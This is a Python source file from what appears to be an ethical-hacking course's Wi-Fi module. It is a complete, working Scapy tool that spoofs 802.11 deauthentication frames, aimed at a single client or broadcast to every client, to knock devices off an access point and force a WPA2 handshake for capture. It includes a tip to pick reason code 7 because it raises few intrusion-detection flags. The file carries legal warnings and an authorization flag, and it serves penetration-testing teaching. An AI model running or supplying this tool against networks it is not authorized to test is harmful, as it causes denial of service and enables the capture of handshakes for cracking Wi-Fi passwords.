#!/usr/bin/env python3
"""
04_attacks/03_deauth.py — Send 802.11 Deauthentication frames to force client reconnection.

⚠  THIS IS AN ACTIVE ATTACK TOOL.
   It transmits frames. It is NOT passive.
   Use only on networks and devices you own or have written authorization to test.
   In Portugal: Lei 109/2009, Art. 7 — unauthorized interference → up to 3 years.
   One piece of paper (authorization letter) is the difference between
   a penetration test and a criminal offense.

Why we use this in Session 3:
   Passive capture waits for natural reconnections. In a lab with controlled
   timing, we don't always have that luxury. Sending a few deauth frames
   forces the client to reconnect immediately, which triggers the WPA2
   4-way handshake that 03_capture/01_handshake_catcher.py can capture.

Usage:
    sudo python3 04_attacks/03_deauth.py \\
        --iface wlan1 \\
        --bssid AA:BB:CC:DD:EE:FF \\
        --client 11:22:33:44:55:66 \\
        --count 5 \\
        --i-have-authorization

    # Broadcast deauth (disconnects ALL clients from the AP)
    sudo python3 04_attacks/03_deauth.py \\
        --iface wlan1 \\
        --bssid AA:BB:CC:DD:EE:FF \\
        --count 5 \\
        --i-have-authorization

Requires: pip install scapy

CYBERS3C — Ethical Hacking Postgrad — Wi-Fi Module — Session 3
"""

import argparse
import sys
import time

try:
    from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
except ImportError:
    print("[!] Scapy missing. pip install scapy")
    sys.exit(1)

# --- make wifi_utils (repo root) importable from any topic subfolder ---
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from wifi_utils import require_root, validate_mac, add_iface_arg

# ──────────────────────────────────────────────
# Constants
# ──────────────────────────────────────────────

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"

# Deauthentication reason codes (IEEE 802.11-2020, Table 9-49)
# We use reason 7 = Class 3 frame received from nonassociated STA
# It's the most common in the wild and raises fewest flags on simple WIDS.
REASON_CODES: dict[int, str] = {
    1:  "Unspecified",
    2:  "Previous auth no longer valid",
    3:  "Deauthenticated — leaving BSS",
    4:  "Inactivity",
    5:  "Too many STAs — AP capacity",
    6:  "Class 2 frame from non-auth STA",
    7:  "Class 3 frame from non-assoc STA",
    8:  "Disassociated — leaving BSS",
    9:  "STA not yet auth'd",
}

# ──────────────────────────────────────────────
# Frame construction
# ──────────────────────────────────────────────

def _build_deauth_pair(bssid: str, client: str, reason: int) -> tuple:
    """
    Build two deauth frames for a given client/AP pair:
    - One spoofed as coming FROM the AP (addr2=bssid, addr1=client)
    - One spoofed as coming FROM the client (addr2=client, addr1=bssid)

    Sending both directions is more effective — some drivers will deauth
    from either side, some are picky. We cover both bases.
    This is why WPA3's Management Frame Protection (PMF) was invented.
    """
    # AP → client direction
    frame_ap_to_sta = (
        RadioTap()
        / Dot11(
            addr1=client,        # destination: the client
            addr2=bssid,         # source: spoofed as AP
            addr3=bssid,         # BSSID
            type=0,              # management
            subtype=12,          # deauth
        )
        / Dot11Deauth(reason=reason)
    )

    # Client → AP direction
    frame_sta_to_ap = (
        RadioTap()
        / Dot11(
            addr1=bssid,         # destination: the AP
            addr2=client,        # source: spoofed as client
            addr3=bssid,
            type=0,
            subtype=12,
        )
        / Dot11Deauth(reason=reason)
    )

    return frame_ap_to_sta, frame_sta_to_ap


def send_deauth(
    iface: str,
    bssid: str,
    client: str,
    count: int,
    interval: float,
    reason: int,
):
    """
    Send `count` deauth frame pairs, `interval` seconds apart.
    Prints progress so you know it's working (or not).
    """
    frame_down, frame_up = _build_deauth_pair(bssid, client, reason)

    target_label = client if client != BROADCAST_MAC else "ALL CLIENTS (broadcast)"
    reason_label = REASON_CODES.get(reason, f"reason {reason}")

    print(f"\n  [*] Sending {count} deauth pairs")
    print(f"      AP     : {bssid}")
    print(f"      Target : {target_label}")
    print(f"      Reason : {reason_label} (code {reason})")
    print(f"      iface  : {iface}")
    print()

    for i in range(1, count + 1):
        # Send both directions
        sendp(frame_down, iface=iface, verbose=False)
        sendp(frame_up,   iface=iface, verbose=False)
        print(f"\r  [{i:3d}/{count}] deauth sent to {target_label}", end="", flush=True)
        if i < count:
            time.sleep(interval)

    print(f"\n\n  [+] Done. {count * 2} frames sent.")
    print(f"      Run 03_capture/01_handshake_catcher.py in another terminal to catch the handshake.")


# ──────────────────────────────────────────────
# Authorization gate
# ──────────────────────────────────────────────

def _authorization_check(authorized: bool, bssid: str):
    """
    Non-negotiable authorization gate.
    If --i-have-authorization is not passed, we refuse to proceed.
    The flag is annoying on purpose — ignorance is not a defense.
    """
    if authorized:
        print(f"  [✓] Authorization declared for BSSID {bssid}. Proceeding.")
        return

    print("""
  ╔══════════════════════════════════════════════════════════════╗
  ║                  AUTHORIZATION REQUIRED                      ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  This tool transmits frames that disconnect Wi-Fi clients.   ║
  ║                                                              ║
  ║  Using it on networks you do not own or have written         ║
  ║  authorization to test is:                                   ║
  ║    • Illegal (PT Lei 109/2009, Art. 7)                       ║
  ║    • Illegal (EU Directive 2013/40/EU)                       ║
  ║    • A very bad idea in general                              ║
  ║                                                              ║
  ║  To proceed, add the flag:                                   ║
  ║    --i-have-authorization                                     ║
  ║                                                              ║
  ║  By passing that flag you confirm you have written           ║
  ║  authorization from the infrastructure owner.                ║
  ╚══════════════════════════════════════════════════════════════╝
""")
    sys.exit(1)


# ──────────────────────────────────────────────
# Entry point
# ──────────────────────────────────────────────

def main():
    require_root()

    parser = argparse.ArgumentParser(
        description=(
            "Send 802.11 deauth frames to force client reconnection. "
            "Active attack — requires authorization."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  # Deauth a specific client\n"
            "  sudo python3 04_attacks/03_deauth.py --iface wlan1 \\\n"
            "      --bssid AA:BB:CC:DD:EE:FF --client 11:22:33:44:55:66 \\\n"
            "      --count 5 --i-have-authorization\n\n"
            "  # Broadcast deauth (kicks everyone off the AP)\n"
            "  sudo python3 04_attacks/03_deauth.py --iface wlan1 \\\n"
            "      --bssid AA:BB:CC:DD:EE:FF --count 3 --i-have-authorization\n\n"
            "Pair with 03_capture/01_handshake_catcher.py to catch the resulting handshake."
        ),
    )
    add_iface_arg(parser)
    parser.add_argument("--bssid",    required=True,  help="Target AP BSSID")
    parser.add_argument("--client",   default=BROADCAST_MAC,
                        help=f"Target client MAC (default: {BROADCAST_MAC} = broadcast)")
    parser.add_argument("--count",    type=int, default=5,
                        help="Number of deauth frame pairs to send (default: 5)")
    parser.add_argument("--interval", type=float, default=0.1,
                        help="Seconds between frame pairs (default: 0.1)")
    parser.add_argument("--reason",   type=int, default=7,
                        choices=list(REASON_CODES.keys()),
                        help=f"Deauth reason code (default: 7)")
    parser.add_argument("--i-have-authorization", action="store_true", dest="authorized",
                        help="Confirm you have written authorization to test this AP")
    args = parser.parse_args()

    # Validate and normalise MAC addresses — validate_mac returns lowercase
    try:
        bssid  = validate_mac(args.bssid)
        client = validate_mac(args.client)
    except ValueError as e:
        print(f"[!] {e}")
        sys.exit(1)

    print(f"\n=== 04_attacks/03_deauth.py ===")
    print(f"    Mode       : ACTIVE — frames will be transmitted")

    _authorization_check(args.authorized, bssid)

    # Broadcast safety gate — disconnects EVERYONE from the AP.
    # Even with authorization, this deserves an extra confirmation.
    if client == BROADCAST_MAC and args.authorized:
        print(f"  [!] BROADCAST deauth will disconnect ALL clients from {bssid}.")
        confirm = input("       Type 'broadcast' to confirm: ")
        if confirm.strip().lower() != "broadcast":
            print("  [*] Aborted.")
            sys.exit(0)

    # Sanity checks
    if args.count > 100:
        print(f"  [!] --count {args.count} seems excessive. Are you sure?")
        print(f"       5-10 frames is usually enough. A deauth flood is a DoS attack.")
        confirm = input("       Type 'yes' to continue: ")
        if confirm.strip().lower() != "yes":
            print("  [*] Aborted.")
            sys.exit(0)

    send_deauth(
        iface    = args.iface,
        bssid    = bssid,
        client   = client,
        count    = args.count,
        interval = args.interval,
        reason   = args.reason,
    )


if __name__ == "__main__":
    main()
